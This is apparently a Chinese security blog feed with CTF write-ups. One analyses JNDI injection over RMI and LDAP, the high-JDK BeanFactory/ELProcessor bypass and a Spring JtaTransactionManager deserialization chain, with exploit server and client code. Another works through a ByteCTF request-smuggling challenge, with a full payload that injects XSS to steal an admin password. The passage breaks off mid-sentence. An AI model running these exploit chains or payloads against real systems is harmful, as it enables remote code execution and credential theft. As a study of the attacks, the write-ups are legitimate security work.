class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>)); <span class="hljs-comment">//构造我们恶意类的名字 这里为EEvil2.class</span><br>            <br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            <span class="hljs-comment">//设置JavaClassName属性值</span><br>            e.addAttribute(<span class="hljs-string">&quot;JavaClassName&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>);<br>            String cbString = <span class="hljs-keyword">this</span>.codebase.toString();<br>            <span class="hljs-keyword">int</span> refPos = cbString.indexOf(<span class="hljs-string">&quot;#&quot;</span>);<br>            <span class="hljs-keyword">if</span> (refPos&gt;<span class="hljs-number">0</span>)&#123;<br>                cbString = cbString.substring(<span class="hljs-number">0</span>,refPos); <span class="hljs-comment">//获取代码库url</span><br>            &#125;<br>            <span class="hljs-comment">//设置一些相关得属性</span><br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>,cbString);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>,<span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>,<span class="hljs-keyword">this</span>.codebase.getRef());  <span class="hljs-comment">//工厂名Evil2</span><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> LDAPResult(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7cd47081e3d04380b549a4e2fdb04318.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>但是上面我用的<code>jdk1.8.0_312</code>导致需要设置<code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>最开始没加上浪费了些时间，不过调试找bug的过程也很受益。其实调试过上面的RMI的过程之后，对于LDAP的调试会熟悉很多。经过调试LDAPclient可以发现，其实只是前面的某些方法所在的类不太一样，但最终还是得回到方法<code>getObjectFactoryFromReference</code>所以我们直接在这个地方打断点。</p><p>跟进字节码得加载</p><p><img src="https://img-blog.csdnimg.cn/fcc09bbdbeb1486c8903e70b3759c186.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>可以发现在<code>loadClass:110, VersionHelper12 (com.sun.naming.internal)</code>中进行了一个if判断当不设置成false得时候不会进行下面的<code>URLClassLoader.newInstance(getUrlArray(codebase), parent);</code></p><p><img src="https://img-blog.csdnimg.cn/709b6a01fb624636884836a797ee31df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>但是注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><h1 id="Spring-Framework反序列化漏洞分析"><a href="#Spring-Framework反序列化漏洞分析" class="headerlink" title="Spring Framework反序列化漏洞分析"></a>Spring Framework反序列化漏洞分析</h1><h2 id="高版本JNDI绕过"><a href="#高版本JNDI绕过" class="headerlink" title="高版本JNDI绕过"></a>高版本JNDI绕过</h2><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p>这里我用的jdk1.8，不用于1.7它在dk8u121之后默认设置中不再支持设置了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>为 false，限制了 RMI 利用方式中从远程加载<code> Class com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>，同样的ldap也是不行的</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220120152645718.png" alt="image-20220120152645718"></p><p><img src="https://img-blog.csdnimg.cn/709b6a01fb624636884836a797ee31df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>关于绕过，引用一下文章中的话</p><blockquote><p>针对 RMI 利用的检查方式中最关键的就是 <code>if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase)</code> 如果 FactoryClassLocation 为空，那么就会进入 <code>NamingManager.getObjectInstance</code> 在此方法会调用 Reference 中的ObjectFactory。因此绕过思路为在目标 classpath 中寻找实现 ObjectFactory 接口的类。在 Tomcat 中有一处可以利用的符合条件的类<code>org.apache.naming.factory.BeanFactory</code> 在此类中会获取 Reference 中的<code>forceString</code> 得到其中的值之后会判断是否包含等号，如果包含则用等号分割，将前一半当做方法名，后一半当做 Hashmap 中的 key。如果不包含等号则方法名变成 set开头。值得注意的是此方法中已经指定了参数类型为 String。后面将会利用反射执行前面所提到的方法。因此需要找到使用了 String 作为参数，并且能 RCE的方法。在<code>javax.el.ELProcessor</code> 中的 eval 方法就很合适</p></blockquote><p>来看一下BeanFactory类的这个方法。首先判断了是否继承了<code>ResourceRef</code>类，然后后面用加载器载入了class，方便后面的实例化。这里的ResourceRef 是这样定义的<code>public class ResourceRef extends AbstractRef</code>，继续往下就是<code>public abstract class AbstractRef extends Reference </code></p><p><img src="https://img-blog.csdnimg.cn/45ce1a7dc7f24593864f0b005f57e51f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>后面代码中<code>get</code>方法获取到了获取到了名为<code>forceString</code>的RefAddr，这里存在着可控的键值对属性，后面调用RefAddr的getContent函数，<code>value = (String)ra.getContent();</code>就可以获得forceString键对应的值。这里需要注意的是，当forceString对应的内容中存在<code>=</code>时，将截取<code>=</code>后面的字符串作为后续调用的函数名。这意味着我们可以任意指定当前对象的类函数了。force键值对中将包含<code>=</code>前面的内容和相应的Method对象。例如<code>test=eval</code>,最终我们将得到eval的Method对象</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220120192907355.png" alt="image-20220120192907355"></p><p><img src="https://img-blog.csdnimg.cn/f7bb4723321f41f296a8fc15cf9be7a0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>再往下走，中间有一大顿循环代码就忽略了，这里贴一下关键代码。这里通过<code>Enumeration e = ref.getAll();</code>获取所有的<code>Refaddr</code>。然后用获取了ra这个RefAddr当前键对应的值。最后用反射调用了这个method。关于最终用来命令执行得函数是<code>javax.el.ELProcessor</code>中得<code>eval</code>函数，在eval函数中可以执行javaEL表达式。这个利用点也是jspshell中经常出现得类。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Enumeration e = ref.getAll();<br>value = (String)ra.getContent();<br>Object[] valueArray = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>];<br>Method method = (Method)forced.get(propName);<br><br>.........<br><br><span class="hljs-keyword">if</span> (method != <span class="hljs-keyword">null</span>) &#123;<br>        valueArray[<span class="hljs-number">0</span>] = value;<br>            <span class="hljs-keyword">try</span> &#123;<br>                method.invoke(bean, valueArray);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> NamingException(<span class="hljs-string">&quot;Forced String setter &quot;</span> + method.getName() + <span class="hljs-string">&quot; threw exception for property &quot;</span> + propName);<br>        &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>分析下exp。这其中还利用了<code>ScriptEngineManager</code>类</p><p>通过ScriptEngineManager这个类可以实现Java跟JS的相互调用，虽然Java自己没有eval函数，但是ScriptEngineManager有eval函数，并且可以直接调用Java对象，也就相当于间接实现了Java的eval功能。但是写出来的代码必须是JS风格的，所以其实又叫表达式引用。它可以实现java，js得相互调用。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMI1_8server</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, NamingException </span>&#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        ResourceRef ref = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-keyword">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-keyword">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(ref);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/evilObj&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9132361c929c4edd8747b997e26bafd9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>server端</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.Spring;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.*;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">server</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//高版本</span><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//本地监听1234端口</span><br>            ServerSocket serverSocket = <span class="hljs-keyword">new</span> ServerSocket(<span class="hljs-number">1234</span>);<br>            System.out.println(<span class="hljs-string">&quot;Server started on port &quot;</span> + serverSocket.getLocalPort());<br>            <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>                Socket socket = serverSocket.accept();<br>                System.out.println(<span class="hljs-string">&quot;Connection received from &quot;</span> + socket.getInetAddress());<br>                ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(socket.getInputStream());<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">//执行接收到类的readObject方法，触发漏洞</span><br>                    Object object = objectInputStream.readObject();<br>                    System.out.println(<span class="hljs-string">&quot;Read object &quot;</span> + object);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;Exception caught while reading object&quot;</span>);<br>                    e.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>client端</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.Spring;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.BufferedInputStream;<br><span class="hljs-keyword">import</span> java.io.BufferedOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> org.springframework.transaction.jta.JtaTransactionManager;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExpClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">//本地注册引用</span><br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Reference ref = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(ref);<br>        registry.bind(<span class="hljs-string">&quot;refObj&quot;</span>,referenceWrapper);<br>        send();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">send</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        JtaTransactionManager obj = <span class="hljs-keyword">new</span> JtaTransactionManager();<br>        Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1234</span>);<br>        System.out.println(<span class="hljs-string">&quot;connect success&quot;</span>);<br>        <span class="hljs-comment">//设置恶意得远程调用类。</span><br>        obj.setUserTransactionName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>);<br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(socket.getOutputStream());<br>        outputStream.writeObject(obj);<br>        outputStream.flush();<br>        outputStream.close();<br>        socket.close();<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>最开始进入<code>initUserTransactionAndTransactionManager</code>初始化方法</p><p><img src="https://img-blog.csdnimg.cn/e4b494885ef0447b8eee58f3a65ed022.png" alt="在这里插入图片描述"></p><p>然后可以看到这里调用了<code>lookupUserTransaction</code>寻找我们设置得恶意值，继续跟进</p><p><img src="https://img-blog.csdnimg.cn/414edb28d96540dba5a6fd5a8457c700.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>然后发现了一个很熟悉得<code>lookup</code>来寻找远程调用对象，其实再往后跟进就能发现就是JNDI常用得那个<code>lookuo</code>方法</p><p><img src="https://img-blog.csdnimg.cn/cacda3a9bde041e5afffe63988a220f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/99df4319b1dc473798ab92bfd5a684af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/e4baa31cd42b41e0a9996127058ebf80.png" alt="在这里插入图片描述"></p><p>这条链看下来还是很清晰得，总结一下：</p><p>由于<code>org.springframework.transaction.jta.JtaTransactionManager</code>类重写了<code>readObject</code>方法，并且其中在重写方法中调用了<code>initUserTransactionAndTransactionManager</code>方法，方法实现得过程中使用<code>lookup</code>方法直接来查询<code>UserTransactionName</code>变量得值，而这个值是可以通过<code>setter</code>来由我们控制得，从而触发远程调用恶意类实现JNDI注入。</p><p>参考文章</p><p><a href="https://www.crisprx.top/archives/389#Spring_Framework_RCE">https://www.crisprx.top/archives/389#Spring_Framework_RCE</a></p><p><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x01-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#0x01-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5</a></p><p><a href="https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/">https://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/131">https://security.tencent.com/index.php/blog/msg/131</a></p><p><a href="https://www.freebuf.com/vuls/253545.html">https://www.freebuf.com/vuls/253545.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bytectf</title>
    <link href="/2022/02/25/2022-2-25-Bytectf%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/02/25/2022-2-25-Bytectf%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Aginx1"><a href="#Aginx1" class="headerlink" title="Aginx1"></a>Aginx1</h1><p>考点是请求走私 + 缓存攻击 + XSS。</p><h3 id="关于源码"><a href="#关于源码" class="headerlink" title="关于源码"></a>关于源码</h3><p>源码的实现分为四个部分：</p><h4 id="用vue实现了前端的小作文界面"><a href="#用vue实现了前端的小作文界面" class="headerlink" title="用vue实现了前端的小作文界面"></a>用vue实现了前端的小作文界面</h4><p>此题是并没有考察vue框架中的相关漏洞的</p><h4 id="实现了bot机器热模拟访问文章"><a href="#实现了bot机器热模拟访问文章" class="headerlink" title="实现了bot机器热模拟访问文章"></a>实现了bot机器热模拟访问文章</h4><p>bot这个功能在常见的xss题目里面都会出现，这里也是可以通过bot进行xss的，整体看bot的功能就是，它在监听一个端口，并且你可以nc连接，将你要访问的文章id发给bot，它会用admin账户去登录查看。这里就联想到如果我们在要访问的文章中插入恶意代码，再让bot访问不就实现了xss了吗。再仔细看源码也可以发现，bot登录了admin账户，并且进行了一个跳转，这里很容易联想到目录穿越，简单的操作一下也可以证实了确实可以目录穿越。</p><p><img src="https://img-blog.csdnimg.cn/9ff7f3aa3aff4722ba291b8aba3b6236.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h4 id="go实现的一个a-ginx反向代理服务"><a href="#go实现的一个a-ginx反向代理服务" class="headerlink" title="go实现的一个a-ginx反向代理服务"></a>go实现的一个a-ginx反向代理服务</h4><p>这里的a-ginx服务主要是用来判断请求的文件是否是缓存文件，当请求的内容没有缓存时转发给另外一个服务处理，并且将正常返回的内容进行一个缓存。</p><p>先是进行了两个判断，一是判断是否能获取到静态文件，二是判断是否有缓存，如果都不是才发起一个代理请求。</p><p><img src="https://img-blog.csdnimg.cn/d973b22abe9a4a3d87db699b684110a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在处理过程的最开始会创建一个和处理代理请求的服务的TCP连接。并且会保持连接。</p><p><img src="https://img-blog.csdnimg.cn/dd06bb4557584c89aab3d048cfe55f95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>我们再来看它是如何发送请求的，可以看到这里就是进行了一个http2的降级，然后简单的进行了一些请求头的字符串拼接，并且添加了一个<code>X-Sup3r-Re4l-Ip</code>头，值就是来自用户的ip地址。这里就涉及到请求走私的问题了。</p><p><img src="https://img-blog.csdnimg.cn/c5234be652ca48f4b6c638200863e98b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h4 id="go实现的处理a-ginx代理转发的请求的服务"><a href="#go实现的处理a-ginx代理转发的请求的服务" class="headerlink" title="go实现的处理a-ginx代理转发的请求的服务"></a>go实现的处理a-ginx代理转发的请求的服务</h4><p>这个最终的处理服务实现了发表文章，查询文章，预览文章等等功能。这里的预览文章是最可疑的，通过go模板显示内容，可能会存在go的模板注入。</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go">&#123;&#123;.title&#125;&#125;&lt;br/&gt;&#123;&#123;.content&#125;&#125;<br></code></pre></div></td></tr></table></figure><p>再看源码发现了还有一个读取flag的功能。这个处理进行了两个判断限制。一是ip地址的范围限制，二是必须用admin用户登录。光是第一个限制我们在前端用户肯定就无法绕过了，所以这里肯定是需要通过bot来访问到这个flag了。</p><p><img src="https://img-blog.csdnimg.cn/5ba5849157e646df8b94c4b4a893f6eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>[]: <a href="https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#">https://bytectf.feishu.cn/docs/doccnq7Z5hqRBMvrmpRQMAGEK4e#</a>    “官方wp”<br>[]: <a href="https://impakho.com/post/bytectf-2021-aginx-writeup">https://impakho.com/post/bytectf-2021-aginx-writeup</a>    “impakho”</p><p>看了大佬的wp还有官方wp，不得不说一步一步的深入分析真的很细致。</p><p>直接看payload吧</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/v4WPbblaISwL%20HTTP/1.1%0D%0AConnection:%20keep-alive%0D%0AHost:%20a%0D%0A%0D%0APOST%20%2Fv/articles/preview</span> <span class="hljs-meta">HTTP/2</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.105.13.40:30443<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>921<br><br>title=%7B%22data%22%3A%7B%22_id%22%3A%221%22%2C%22title%22%3A%222%22%2C%22author%22%3A%223%22%2C%22htmlContent%22%3A%22&amp;content=%3Cimg%20src%3D&#x27;test&#x27;%20onerror%3D&#x27;var%20xhttp1%20%3D%20new%20XMLHttpRequest()%3Bxhttp1.open(%5C%22POST%5C%22%2C%20%5C%22%2Fv%2Farticles%5C%22%2C%20true)%3Bxhttp1.setRequestHeader(%5C%22Content-Type%5C%22%2C%5C%22application%2Fjson%5C%22)%3Bxhttp1.setRequestHeader(%5C%22Authorization%5C%22%2C%5C%22Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MzUwMTgxODYsInVzZXJuYW1lIjoiblZtU1N0UHpJU1E5In0.Z8kRojnNNNd6-g7Il3BPzvuGdVz-UtqaQzjWPsC1FMw%5C%22)%3Bxhttp1.send(JSON.stringify(%7B%5C%22title%5C%22%3A%5C%22here_is_pwd%5C%22%2C%5C%22content%5C%22%3Adocument.getElementById(%5C%22app%5C%22).__vue__.%24children%5B2%5D._data.form.password%2C%5C%22tags%5C%22%3A%5B%5D%2C%5C%22is_public%5C%22%3Afalse%7D))%3B&#x27;%3E%22%2C%22submissionTime%22%3A4%2C%22tags%22%3A%225%22%7D%2C%22status%22%3A0%7D<br></code></pre></div></td></tr></table></figure><p>在a-ginx代理转发过程中会进行一次url解码，之后会看到如下请求，这个的GET和POST会被当作是两个请求的，因为http的请求分割是通过<code>%0D%0A%0D%0A</code>来判断。这里的GET请求之后又会接着发送POST，所